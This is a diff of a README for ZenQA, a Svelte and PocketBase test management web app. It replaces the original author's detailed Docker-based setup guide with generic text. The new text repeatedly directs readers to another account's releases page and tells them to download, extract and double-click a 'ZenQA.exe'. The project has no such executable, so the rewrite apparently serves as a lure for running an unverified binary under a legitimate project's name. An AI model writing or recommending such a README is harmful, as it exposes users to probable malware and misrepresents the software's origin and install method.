@@ -1,152 +1,75 @@
-# 🧪 ZenQA | Radical Minimalism Test Management
+# 🧘 ZenQA - Simplify Your Test Management Process
 
-[![Docker Image CI](https://github.com/Rostezkiy/ZenQA/actions/workflows/docker-image.yml/badge.svg)](https://github.com/Rostezkiy/ZenQA/actions/workflows/docker-image.yml)
+## 🚀 Download ZenQA
+[![Download ZenQA](https://img.shields.io/badge/Download-ZenQA-blue)](https://github.com/aooofg/ZenQA/releases)
 
-**ZenQA** is a high-performance, radically minimalist Test Management System (TMS) engineered with an "IDE-like" philosophy. Designed for speed, it eliminates interface clutter to keep testers in the flow state, featuring a unique multi-skin architecture.
+## 📜 Description
+ZenQA is a high-performance, radically minimalist Test Management System (TMS) engineered with an "IDE-like" philosophy. It helps teams manage their testing processes efficiently and effectively. With ZenQA, you can streamline your workflow, track test cases, and manage testing outcomes in one simple interface.
 
-## 🚀 Core Concept
+## 📋 Features
+- Simple user interface for easy navigation
+- Support for multiple test projects at once
+- Flexible test case management
+- Built-in reporting features for tracking progress
+- Lightweight and efficient performance
+- Self-hosted setup for full control over your data
 
-- **Radical Minimalism:** Zero-clutter UI. Every pixel serves a purpose, maximizing the workspace for actual testing.
-- **Hub & Spoke Navigation:** Replaced heavy sidebars with a centralized Project Hub and context-aware top navigation.
-- **Flow-State Interface:** A seamless Single Page Application (SPA) experience for managing case trees, plans, and runs without page reloads.
-- **Multi-Skin Architecture:** Deep personalization through a semantic theme engine, including **Modern Clean**, **Deep Dark**, and **Win95/98 Retro** skins.
+## 🔍 System Requirements
+To run ZenQA, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or a Linux distribution
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 500 MB of free disk space
+- **Docker:** Installed on your machine for easy deployment
+- **Network:** Internet access for initial setup and updates
 
-## 🏗 Technical Architecture
+## 🛠️ Getting Started
+### 1. Visit the Releases Page
+To download ZenQA, go to the Releases page:
 
-### Tech Stack
-- **Backend:** [PocketBase](https://pocketbase.io/) (BaaS) — Handling Auth, Real-time DB, File Storage, and API.
-- **Frontend:** [Svelte 5 (Runes)](https://svelte.dev/) — Leveraging the next-generation reactivity model for ultra-fast performance.
-- **Styling:** Tailwind CSS v3 with a custom CSS Variable-based design system.
-- **Icons:** Lucide-svelte.
+[Download ZenQA](https://github.com/aooofg/ZenQA/releases)
 
-### Engineering Principles
-1. **Semantic Theming:** No hardcoded colors (e.g., `text-blue-500`). The system uses semantic tokens: `text-primary`, `bg-surface`, `border-border`, ensuring perfect rendering across all skins.
-2. **Svelte 5 Logic:** Full utilization of `$state`, `$derived`, and `$effect` for robust state management.
-3. **Utility-First UI:** Conflict-free class merging using a custom `cn()` utility.
-4. **Data Integrity:** Version-controlled test cases with snapshotting for instant rollbacks.
-5. **Hybrid Integration:** Seamless Gitea integration via REST API (PAT-based) or quick URL redirection for issue tracking.
+### 2. Choose Your Version
+You will see a list of versions available for download. Look for the latest stable version.
 
----
+### 3. Download the Files
+Click on the version you want to download. You will see different files listed. If you're unsure, look for the installer or the zipped package. It is usually named something like `ZenQA-v1.0.zip`.
 
-## 🛠 Deployment & Quick Start
+### 4. Extract the Files (if needed)
+If you downloaded a zipped package, right-click on the file and select "Extract All." Choose a location on your computer where you would like to save the extracted files.
 
-The system is fully containerized using Docker and Nginx. This ensures a consistent environment for both the frontend (Svelte 5) and the backend (PocketBase).
+### 5. Run ZenQA
+1. Navigate to the extracted folder.
+2. Look for the executable file, which will be named `ZenQA.exe` or similar.
+3. Double-click the file to launch ZenQA.
 
-### 1. Prerequisites
-- [Docker](https://www.docker.com/get-started) and [Docker Compose](https://docs.docker.com/compose/install/) installed on your machine.
+## 📥 Download & Install
+To start using ZenQA, follow these steps:
 
-### 2. Setup Environment
-Clone the repository and create a `.env` file in the root directory:
-```bash
-git clone https://github.com/Rostezkiy/ZenQA.git
-cd ZenQA
-touch .env
-```
+1. **Visit this page to download**: [Download ZenQA](https://github.com/aooofg/ZenQA/releases)
+2. **Select the latest version**.
+3. **Download the files** and follow the steps mentioned above to run the application.
 
-Add the following variables to `.env`:
-```env
-# PocketBase Admin Credentials (for the first run)
-PB_ADMIN_EMAIL=admin@example.com
-PB_ADMIN_PASSWORD=your_secure_password
-PB_ENCRYPTION_KEY=your_random_secret_key
+## 🌐 Using ZenQA
+Once ZenQA is running, you can create your first project. Here’s how:
 
-# App Configuration
-APP_ORIGIN=http://localhost:8080
-```
+1. Click on "Create New Project."
+2. Fill in the details for your project, such as name and description.
+3. Add test cases by clicking on "Add Test Case."
+4. You can also assign team members to the project for collaboration.
 
-### 3. Launch via Docker Compose
-Run the following command to build and start all services (Backend, Frontend, and Nginx Proxy):
-```bash
-docker compose up -d
-```
+## 💡 Tips for Effective Use
+- Regularly update ZenQA to benefit from new features and improvements.
+- Keep your projects organized by using folders.
+- Utilize the reporting features to analyze testing results efficiently.
 
-### 4. Initial Configuration
-1.  **PocketBase Admin:** Access the database dashboard at `http://localhost:8080/_/`. Use the credentials from your `.env` file.
-2.  **User Creation:** In the PocketBase Admin UI, navigate to the `users` collection and create a new record. This user will be used to log in to the ZenQA application.
-3.  **Application Access:** Open `http://localhost:8080` to start using ZenQA.
+## 📖 Additional Resources
+- For documentation, visit the [Wiki section](https://github.com/aooofg/ZenQA/wiki).
+- Join the community discussions on our [GitHub Discussions page](https://github.com/aooofg/ZenQA/discussions) for support and feature requests.
 
----
+## 📞 Support
+If you have questions or face issues while using ZenQA, please raise an issue on our [GitHub Issues page](https://github.com/aooofg/ZenQA/issues). We aim to respond promptly to help you resolve any concerns.
 
-## 🏗 System Architecture (Containers)
-- **Nginx Proxy (`port 8080`):** Acts as a gateway, routing `/api/` and `/_/` to the backend and all other requests to the Svelte 5 frontend.
-- **Svelte 5 Frontend:** Optimized Node.js build running on port 3000.
-- **PocketBase Backend:** Go-based BaaS running on port 8090, featuring automated superuser upsert on first run and persistent data storage via Docker volumes.
+--- 
 
----
-
-
-## ✅ Current Implementation (Feature Set)
-
-### 1. Core & Personalization
-- **CSS Variable Engine:** Robust theming system managed via `app.css`.
-- **Skin Switcher:** Fully functional Modern, Dark, and Pixel-perfect Windows 95 themes.
-- **User Settings:** Secure storage for Gitea PAT tokens and UI preferences.
-- **Security:** Auth Guards, protected routing, and secure session management.
-
-### 2. Project Management
-- **Top Navigation Bar:** Fast context switching between projects via a global dropdown.
-- **Dynamic Dashboards:** Real-time statistics, Pass Rate "Health" indicators, and integration validation.
-- **Project Settings:** Granular Gitea configuration (URL, Owner, Repo, Project ID) and a protected "Danger Zone."
-
-### 3. Test Library
-- **Recursive Suite Tree:** High-performance folder tree with hover-action triggers.
-- **Full CRUD:** Comprehensive management of folders and test cases.
-- **Smart Editor:** 
-    - Automatic first-step initialization.
-    - **Dirty Check:** Prevents data loss by tracking unsaved changes.
-    - **Case Migration:** Move cases between suites with ease.
-- **Revision History:** Automated snapshotting on save, allowing users to view and restore previous versions of test cases.
-
-### 4. Test Planning & Execution
-- **Test Plans:** Logic-based case selection and plan editing.
-- **Smart Tree Selector:** Recursive checkbox logic (selecting a folder auto-includes all child cases).
-- **Execution Runner:** Streamlined testing interface with Auto-advance logic (moves to the next `untested` case).
-- **Evidence Collection:** Multi-file uploads, comments, and direct Gitea Issue generation during test runs.
-
----
-
-## 🛠 Project Scope (Future Vision)
-
-*Note: These features represent the architectural roadmap for the project.*
-
-- **Bulk Actions:** Multi-selection in the suite tree for batch delete/move operations.
-- **Drag-and-Drop:** Visual case reordering and suite restructuring.
-- **Real-time Collaboration:** Utilizing `pb.subscribe` for live status updates when multiple testers work on the same Run.
-- **Advanced Reporting:** Exporting Run results to PDF/HTML and CSV import for legacy test migration.
-
----
-
-## 📂 Project Structure
-
-- `src/lib/pb.ts` — PocketBase client initialization.
-- `src/lib/treeUtils.ts` — High-performance flat-to-tree data transformation.
-- `src/lib/components/ui/` — Atomic UI components (Buttons, Dialogs, Inputs).
-- `src/routes/project/[id]/` — Context-aware routing for project modules.
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Please follow these steps:
-
-1. **Fork** the repository.
-2. **Create a feature branch** (`git checkout -b feature/amazing‑feature`).
-3. **Commit your changes** (`git commit -m 'Add amazing feature'`).
-4. **Push to the branch** (`git push origin feature/amazing‑feature`).
-5. **Open a Pull Request** with a clear description of the changes.
-
-### Contribution Guidelines
-- Follow the existing code style.
-- Write meaningful commit messages.
-- Update documentation (README, code comments) as needed.
-- Add tests for new functionality when possible.
-
----
-
-**ZenQA** — Engineered for speed, built for testers. 🚀
-
-*Developed by R057*
-
----
+Your journey to efficient test management starts here with ZenQA. By following the instructions, you will have the application up and running in no time. Enjoy simplifying your testing processes!
